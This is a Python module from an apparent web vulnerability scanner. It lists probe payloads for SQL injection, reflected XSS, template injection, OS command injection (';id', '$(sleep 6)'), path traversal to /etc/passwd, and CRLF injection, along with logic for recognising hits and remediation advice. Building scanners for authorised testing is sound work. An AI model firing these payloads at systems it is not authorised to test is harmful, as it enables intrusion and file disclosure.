"""
Payload library + detection for Yggdrasil's deep parameter fuzzer.

Encodes the payload sets and the 'tells' a penetration tester / bug-bounty hunter
watches for, per vulnerability class: SQL injection (error-based and time-based
blind), reflected XSS, server-side template injection, OS command injection, path
traversal, and CRLF/response-splitting. Pure and deterministic — Tyr owns
transport; this module owns *what to send* and *how to recognise a hit*.

Every payload is a NON-DESTRUCTIVE detection probe: it triggers an error, reflects
a unique canary, evaluates arithmetic, reads a world-readable file, or runs a
benign `id`/`sleep`. Nothing here writes, deletes, drops, or persists data. For use
only against targets you are authorized to test.
"""
import re

# Unique markers — chosen so a natural page is astronomically unlikely to contain
# them, making reflection/evaluation unambiguous.
CANARY = "yggf9x27"          # generic reflection canary
SSTI_EXPECT = "1763"         # == 41*43; if the response contains it, math was evaluated
CMD_RE = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+")   # output of `id`

# ── payload sets ─────────────────────────────────────────────────
SQLI_ERROR = [
    "'", "\"", "')", "';", "\"))", "`",
    "' OR '1'='1", "' OR 1=1-- -", "\" OR \"1\"=\"1",
    "1' ORDER BY 99-- -", "' UNION SELECT NULL-- -", "%27",
]
SQLI_TIME = [
    "' OR SLEEP(6)-- -", "\"||(SELECT SLEEP(6))||\"",
    "'||pg_sleep(6)--", "');SELECT pg_sleep(6)--",
    "1)) OR SLEEP(6)#", "1' WAITFOR DELAY '0:0:6'-- -",
]
XSS = [
    f"<{CANARY}>", f"\"><{CANARY}>", f"'><{CANARY}>",
    f"<img src=x onerror={CANARY}>", f"<svg onload={CANARY}>",
    f"\"><script>{CANARY}</script>",
]
SSTI = [
    "${41*43}", "#{41*43}", "{{41*43}}", "<%= 41*43 %>",
    "${{41*43}}", "{41*43}", "@(41*43)", "*{41*43}",
]
CMDI = [
    ";id", "|id", "||id", "&&id", "`id`", "$(id)", "%0aid", "; id #", "&id",
]
CMDI_TIME = [";sleep 6", "|sleep 6", "$(sleep 6)", "`sleep 6`", "&& sleep 6"]
TRAVERSAL = [
    "../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd", "/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..\\..\\..\\..\\windows\\win.ini",
]
CRLF = [f"%0d%0aX-Ygg-Inj:{CANARY}", f"%0aX-Ygg-Inj:{CANARY}", f"%E5%98%8a%E5%98%8dX-Ygg-Inj:{CANARY}"]

SQL_ERROR_SIGNATURES = (
    "sql syntax", "mysql_fetch", "you have an error in your sql", "ora-0",
    "psql:", "sqlite", "sqlstate", "pdoexception", "microsoft ole db", "odbc",
    "unterminated", "quoted string not properly terminated", "syntax error at or near",
    "unclosed quotation mark", "pg::", "sqlalchemy.exc", "warning: mysqli",
    "supplied argument is not a valid mysql", "conversion failed",
)

# family -> (severity, cvss, remediation, description)
_META = {
    "sqli_error":  ("high", 8.2, "Use parameterized queries / prepared statements; never build SQL from input.",
                    "A crafted value provoked a database error, proving the parameter is concatenated into a SQL query — an attacker can read or modify the database."),
    "sqli_time":   ("high", 8.6, "Use parameterized queries; the parameter reaches the SQL engine unfiltered.",
                    "A time-delay payload made the response hang, confirming blind SQL injection: the parameter reaches the SQL engine and an attacker can extract data boolean/timing bit by bit."),
    "xss":         ("high", 7.4, "Context-aware output encoding + a strict Content-Security-Policy.",
                    "An injected HTML/script payload was reflected unencoded, letting an attacker run arbitrary JavaScript in a victim's browser (session theft, credential harvesting)."),
    "ssti":        ("critical", 9.4, "Never render user input as a template; sandbox the engine / use logic-less templates.",
                    "A template expression was evaluated server-side (math executed), confirming server-side template injection — frequently a path to remote code execution."),
    "cmdi":        ("critical", 9.8, "Never pass input to a shell; use exec with an argument array and an allowlist.",
                    "Injected shell syntax executed the `id` command on the server, confirming OS command injection — full server compromise is likely."),
    "cmdi_time":   ("critical", 9.8, "Never pass input to a shell; the parameter reaches OS command execution.",
                    "A shell time-delay payload made the response hang, confirming blind OS command injection: input reaches a shell."),
    "traversal":   ("high", 7.5, "Canonicalize and allowlist paths; never build filesystem paths from input.",
                    "A directory-traversal payload returned the contents of a system file, confirming arbitrary file read."),
    "crlf":        ("high", 6.5, "Strip CR/LF from any input reflected into response headers.",
                    "A CR/LF payload injected a new response header, enabling response splitting, cache poisoning, or header-based attacks."),
}


def family_description(family: str) -> str:
    meta = _META.get(family)
    return meta[3] if meta else ""


def _v(family, title, evidence):
    sev, cvss, rem, desc = _META[family]
    return {"family": family, "title": title, "severity": sev, "cvss": cvss,
            "evidence": evidence, "remediation": rem, "description": desc}


def probe_families(include_time: bool = True):
    """The (family, payload) plan a full per-parameter sweep fires. Fast, single-
    request detectors first; the slow time-based blind probes last (and optional)."""
    plan = []
    for p in SQLI_ERROR:  plan.append(("sqli_error", p))
    for p in XSS:         plan.append(("xss", p))
    for p in SSTI:        plan.append(("ssti", p))
    for p in CMDI:        plan.append(("cmdi", p))
    for p in TRAVERSAL:   plan.append(("traversal", p))
    for p in CRLF:        plan.append(("crlf", p))
    if include_time:
        for p in SQLI_TIME:  plan.append(("sqli_time", p))
        for p in CMDI_TIME:  plan.append(("cmdi_time", p))
    return plan


def evaluate(family, payload, resp_text, status=200, elapsed=None, resp_headers=None,
             base_text="", base_status=200, base_elapsed=None):
    """Return a verdict dict for a confirmed hit, else None. Detection is
    differential where it can be (error/marker present in the probe response but not
    the benign baseline; timing delta over baseline) to cut false positives."""
    text = resp_text or ""
    low = text.lower()
    base_low = (base_text or "").lower()

    if family == "sqli_error":
        hit = next((s for s in SQL_ERROR_SIGNATURES if s in low and s not in base_low), None)
        if hit:
            return _v("sqli_error", "SQL Injection (error-based)",
                      f"DB error signature '{hit}' returned for payload {payload!r} (HTTP {status})")

    elif family == "sqli_time":
        if elapsed is not None and base_elapsed is not None and elapsed >= 5.0 and (elapsed - base_elapsed) >= 4.0:
            return _v("sqli_time", "SQL Injection (time-based blind)",
                      f"Response delayed {elapsed:.1f}s vs {base_elapsed:.1f}s baseline for {payload!r}")

    elif family == "xss":
        # Unencoded reflection of a payload that carries a tag / event handler.
        if ("<" in payload or "onerror" in payload or "onload" in payload) and payload in text:
            return _v("xss", "Reflected XSS (unencoded payload reflected)",
                      f"Payload reflected verbatim in the response body: {payload!r} (HTTP {status})")

    elif family == "ssti":
        if SSTI_EXPECT in low and SSTI_EXPECT not in base_low and payload not in text:
            return _v("ssti", "Server-Side Template Injection",
                      f"Template expression evaluated: {payload!r} produced {SSTI_EXPECT} in the response")

    elif family == "cmdi":
        if CMD_RE.search(text) and not CMD_RE.search(base_text or ""):
            return _v("cmdi", "OS Command Injection",
                      f"`id` output returned for payload {payload!r} (HTTP {status})")

    elif family == "cmdi_time":
        if elapsed is not None and base_elapsed is not None and elapsed >= 5.0 and (elapsed - base_elapsed) >= 4.0:
            return _v("cmdi_time", "OS Command Injection (time-based blind)",
                      f"Response delayed {elapsed:.1f}s vs {base_elapsed:.1f}s baseline for {payload!r}")

    elif family == "traversal":
        if (re.search(r"root:.*?:0:0:", text) or "[extensions]" in low or "[fonts]" in low) \
                and not re.search(r"root:.*?:0:0:", base_text or ""):
            return _v("traversal", "Path Traversal / LFI (file read)",
                      f"System file contents returned for payload {payload!r} (HTTP {status})")

    elif family == "crlf":
        blob = " ".join(f"{k}: {v}" for k, v in (resp_headers or {}).items()).lower().replace(" ", "")
        if f"x-ygg-inj:{CANARY}" in blob:
            return _v("crlf", "CRLF Injection / HTTP Response Splitting",
                      f"Injected header reflected via payload {payload!r}")

    return None
